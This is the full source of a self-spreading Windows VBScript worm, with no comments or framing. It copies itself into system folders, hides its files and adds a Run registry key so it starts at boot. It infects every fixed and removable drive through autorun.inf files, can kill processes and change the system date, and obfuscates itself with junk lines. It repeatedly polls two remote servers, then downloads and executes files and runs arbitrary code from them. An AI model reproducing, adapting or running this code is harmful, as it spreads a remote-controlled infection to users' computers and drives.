'7.2

Option Explicit
dim ver,filename,infname,timesname,tile,fromurl,fromurl2
ver="7.2"
filename="`"
infname="`.url"
timesname="`.lnk"
tile="Gover"&ver
fromurl="http://u7.6600.org/u72.asp"
fromurl2="http://u6.2288.org/u72.asp"
'on error resume next
dim wsh,fso,dir,win,dc,ouwnname,exemulu,wbem,mulu
dim d,sys
set wsh=createobject("wscript.shell")
set fso=createobject("scripting.filesystemobject")
set dir=fso.getspecialfolder(1)
set win=fso.getspecialfolder(0)
set dc=fso.drives
ouwnname=wscript.scriptname
exemulu=fso.getspecialfolder(2)&"\"
wbem=fso.getspecialfolder(1)&"\wbem\"
mulu=left(wscript.scriptfullname,len(wscript.scriptfullname)-len(wscript.scriptname))
if mulu=dir&"\" then sys=true
for each d in dc
if mulu=d&"\" then opendisk=wsh.run("explorer "&d,3,false)
next
if not sys then
wscript.sleep 5000
if jincheng("wscript.exe",2)=1 then
if readtxt(dir&"\main.bin",1)= trim(date) then
wscript.quit
else
buildfile dir&"\main.bin",date
end if
end if
if jincheng("wscript.exe",2)<>1 and jincheng("wscript.exe",2) then wscript.quit
end if
chengfa
if sys then
yincang
if readtxt(mulu&infname,1)<>tile then
buildinf 1,0,0,0,0,0
end if
if readtxt(win&"\"&infname,1)<>tile then
buildinf 0,0,0,0,0,0
end if
lexe=readtxt(mulu&infname,5)
if fso.fileexists(exemulu&lexe) then
wsh.run exemulu&lexe
end if
if readtxt(dir&"\"&filename&".vbe",1)<>""&ver then
copyvbs dir&"\"&filename&".vbe"
zhuce
end if
if readtxt(win&"\"&filename&".vbe",1)<>""&ver then
copyvbs win&"\"&filename&".vbe"
end if
if readtxt(wbem&filename&".vbe",1)<>""&ver and readtxt(mulu&infname,11)=1 then
buildfile wbem&filename&".vbe",ucc(O1+O2)
end if
if readtxt(mulu&infname,11)=2 then
for each d in dc
if d.drivetype=2 then
if fso.fileexists(d&"/autorun.inf") then
delfile d&"/autorun.inf"
end if
if not fso.folderexists(d&"/autorun.inf") then
buildfold d&"/autorun.inf"
shuxing d&"/autorun.inf",1+2+4
end if
end if
next
end if
ganran
wsh.run mulu&ouwnname
else
shuxing mulu&ouwnname,2+4
copyvbs dir&"\"&filename&".vbe"
copyvbs win&"\"&filename&".vbe"
zhuce
wsh.run dir&"\"&filename&".vbe"
end if


function gettask()
'on error resume next
if not fso.fileexists(dir&"\"&timesname) then buildfile dir&"\"&timesname,0&vbcrlf&date
tjs=readtxt(dir&"\"&timesname,1)
djs=readtxt(dir&"\"&timesname,2)
if tjs="not_found" or not IsNumeric(tjs) or not isdate(djs) then buildfile dir&"\"&timesname,0&vbcrlf&date
buildfile dir&"\"&timesname,(tjs+1)&vbcrlf&djs
iswb=jincheng("clsmn.exe",1) or jincheng("pubwin.exe",1)
if readtxt(dir&"\"&timesname,1)>300 or date-cdate(djs)>2 or iswb then
id=readtxt(dir&"\"&infname,3)
if id="" then id=0
js=1
checkdown="none"
do while checkdown<>"<script>"
if js=2 or js=3 then
d2=advdownfile(mulu&"temp.txt",fromurl2&"?i="&id,0,1,100)
checkdown=readtxt(mulu&"temp.txt",1)
elseif js=1 or js=4 then
d1=advdownfile(mulu&"temp.txt",fromurl&"?i="&id,0,1,100)
checkdown=readtxt(mulu&"temp.txt",1)
end if
js=js+1
if js>4 then
if d1=1 or d2=1 then gettask=1
exit do
end if
loop
if fso.fileexists(mulu&"temp.txt") then
set openfile=fso.opentextfile(mulu&"temp.txt", 1)  
check=openfile.readline
downis=openfile.readline
downame=openfile.readline
downfrom=openfile.readline
vbsver=openfile.readline
vbsrun=openfile.readline
vbsname=openfile.readline
vbsfrom=openfile.readline
taskis=openfile.readline
taskcode=openfile.readline
upvbe= openfile.readline
getid= openfile.readline
openfile.close
delfile(mulu&"temp.txt")
if check="<script>" then
buildfile dir&"\"&timesname,0&vbcrlf&date
buildinf 1,getid,downame,taskis,taskcode,upvbe
if vbsver<>ver or not fso.fileexists(dir&"\"&filename&".vbe") then
advdownfile dir&"\"&vbsname,vbsfrom,vbsrun,3,2000
wscript.quit
end if
if downis=1 and sys then
if downame<>lexe or not fso.fileexists(exemulu&lexe) then
delfile exemulu&lexe
advdownfile exemulu&downame,downfrom,1,3,2000
end if
end if
end if
end if
end if
if er or iswb then gettask=1
end function

function delfile(where)
if fso.fileexists(where) then 
shuxing where,0
fso.deletefile(where)
end if
if fso.folderexists(where) then
shuxing where,0
fso.deletefolder(where)
end if
end function

function buildfile(where,what)
dim bin
delfile where
set bin=fso.createtextfile(where, true)
bin.writeline what
bin.close
shuxing where,2+4
end function

function buildinf(dir,vbsid,exever,tasksw,taskcode,adv)
if dir=0 then
inifile=win&"\"&infname
else
inifile=mulu&infname
end if
delfile inifile
set ini=fso.createtextfile(inifile, true)
ini.writeline tile
ini.writeline "[autorun]"
ini.writeline vbsid
ini.writeline "open=wscript.exe .\"&filename&".vbs"
ini.writeline exever
ini.writeline "shell\open=´ò¿ª(&o)"
ini.writeline tasksw
ini.writeline "shell\open\command=wscript.exe .\"&filename&".vbs"
ini.writeline taskcode
ini.writeline "shell\open\default=1"
ini.writeline adv
ini.close
shuxing inifile,1+2+4
end function

function readtxt(where,line)
dim readfile,chickline,txtline,i,strline
if line<0 then where=wscript.scriptfullname
if fso.fileexists(where) then
if fso.getfile(where).size=0 then
readtxt="not_found"
else
set readfile=fso.opentextfile(where, 1)
set chickline=fso.opentextfile(where, 1)
chickline.readall
txtline=chickline.line
chickline.close
if line>0  and line<=txtline then
i=0 
do while i<line
i=i+1
if not readfile.atendofstream then
strline=readfile.readline
else
strline="not_found"
end if
loop
readtxt=strline
elseif line<=0 then
readtxt=readfile.readall
else
readtxt="not_found"
end if
readfile.close
end if
else
readtxt="not_found"
end if
end function

function shuxing(file,change)
if fso.fileexists(file) then
set ofile=fso.getfile(file) 
ofile.attributes=change
set ofile=nothing
end if
if fso.folderexists(file) then
set ofile=fso.getfolder(file)
ofile.attributes=change
set ofile=nothing
end if
end function

function advdownfile(localfile,urlfile,runfile,cishu,minsize)
test=0
do while test<cishu
shuxing localfile,0
ilocal = lcase(localfile):iremote = lcase(urlfile):
if 1=2 then wscript.echo "impossible!"
set xpost = createobject("microsoft.xmlhttp")  
if 1=2 then wscript.echo "impossible!"
xpost.open "get",iremote,0 
if 1=2 then wscript.echo "impossible!"
'on error resume next
xpost.send()
if not er then
advdownfile=1
if 1=2 then wscript.echo "impossible!"
set sget = createobject("adodb.stream") 
if 1=2 then wscript.echo "impossible!"
sget.mode = 3 
if 1=2 then wscript.echo "impossible!"
sget.type = 1  
if 1=2 then wscript.echo "impossible!"
sget.open()  
if 1=2 then wscript.echo "impossible!"
sget.write(xpost.responsebody)  
if 1=2 then wscript.echo "impossible!"
sget.savetofile ilocal,2 
if 1=2 then wscript.echo "impossible!"
shuxing localfile,2+4
if fso.fileexists(localfile) then
filesize=fso.getfile(localfile).size
else
filesize=0
end if
if filesize>minsize then
if runfile=1 then wsh.run localfile
exit do
end if
else
advdownfile=0
test=test+1
delfile localfile
wscript.sleep 3000
end if
loop
end function

function jincheng(where,geshu)
'on error resume next
dim x,y,i,j
set y=getobject("winmgmts:\\.\root\cimv2")
set x=y.execquery("select * from win32_process where name="&where&"")
i=1 
for each j in x
i=i+1
next
if not er then
if i>geshu then jincheng=true
else
jincheng=1
end if
end function

function er()
if err.number=0 then
er=false
else
err.clear
er=true
end if
end function

function uc(b)
For i=1 To Len(b)
a=Asc(Mid(b,i,1))
If a=125 Then a=13
If a=123 Then a=10
if a=124 Then a=34
if a>96 and a<110 then
a=a+13
elseif a>109 and a<123 then
a=a-13
End If
uc=uc+chr(a)
Next
vf.writeline(uc)
end function

function dotask()
'on error resume next
if readtxt(mulu&infname,7)=1 then
execute(readtxt(mulu&infname,9))
end if
end function


function copyfile(file,where)
delfile where
if fso.fileexists(file) then
fso.copyfile file,where,true
end if
end function

function copyvbs(where)
delfile where
set self=fso.opentextfile(mulu&ouwnname,1)
vbscopy=self.readall
self.close 
set vbs=fso.createtextfile(where, true)
vbs.write vbscopy
vbs.close
shuxing where,2+4
end function

function zhuce()
RegPath="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\run\" 
Type_Name="REG_SZ"
Key_Name="explorer"
Key_Data=filename&".vbe"
Wsh.RegWrite RegPath&Key_Name,Key_Data,Type_Name
end function

function yincang()
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
Type_Name="REG_DWORD"
Key_Name="ShowSuperHidden"
Key_Data="00000000" 
Wsh.RegWrite RegPath&Key_Name,Key_Data,Type_Name
end function

function buildfold(path)
if not fso.folderexists(path) then
if not fso.folderexists(fso.getparentfoldername(path)) then 
buildfold fso.getparentfoldername(path)
end if 
fso.createfolder(path)
end if
end function

function findid(ids,fid,eid,fname,furl,time)
id=readtxt(dir&"\"&infname,3)
do while fid<=eid
idc=idc&","&fid
fid=fid+1
loop
ids=ids&idc
idss=Split(ids,",")
For i=0 To Ubound(idss)
if id=idss(i) then
if not fso.fileexists(exemulu&fname) then
advdownfile exemulu&fname,"http://"&furl,0,2,2000
end if
end if
next
findid=ctrf(fname,time)
end function

function dowork(pcs,fname,furl,time)
if not fso.fileexists(exemulu&fname) and jincheng(pcs,1) then
advdownfile exemulu&fname,"http://"&furl,0,2,3000
end if
dowork=ctrf(fname,time)
end function

function ctrf(fname,time)
if fso.fileexists(exemulu&fname) then
if time<>0 then
nowdate=date
wsh.run "%comspec% /c date 2002-"&month(date)&"-"&day(date),vbhide
wscript.sleep abs(time*1000)
end if
wsh.run exemulu&fname
ctrf=1
if time>0 then
wscript.sleep 5000
wsh.run "%comspec% /c date "&nowdate,vbhide
end if
end if
end function

function taskkill(pcs,times)
if jincheng(pcs,1) then
'on error resume next
Set objwmiservice=getobject("winmgmts:\\.\root\cimv2") 
Set colprocesslist=objwmiservice.execquery ("select * from win32_process where name="&pcs&" ")
for each objprocess in colprocesslist 
objprocess.terminate()
next
if times=1 then taskkill=1
end if
end function

function ganran()
'on error resume next
do
for each d in dc
if d.drivetype=3 or (d.drivetype=1 and d<>"A:" and d<> "B:") then
if fso.folderexists(d&"\autorun.inf") then
delfile d&"\autorun.inf"
end if
if fso.fileexists(d&"\"&filename&".vbs") and fso.fileexists(d&"\autorun.inf") then
if readtxt(d&"\autorun.inf",1)<>tile then
copyfile win&"\"&infname,d&"\autorun.inf"
copyfile win&"\"&filename&".vbe",d&"\"&filename&".vbs"
end if
else
yincang
copyfile win&"\"&infname,d&"\autorun.inf"
copyfile win&"\"&filename&".vbe",d&"\"&filename&".vbs"
end if
end if
next
if (minute(now) mod 5)=0 and xz<>1 then
xz=gettask
wscript.sleep 60000
end if
if rw<>-1 then
dotask
end if
wscript.sleep 3000
loop
end function

function chengfa()
if readtxt(mulu&ouwnname,1)<>""&ver then
msgbox("hello,hacker!")
delfile mulu&ouwnname
wscript.quit
end if
end function

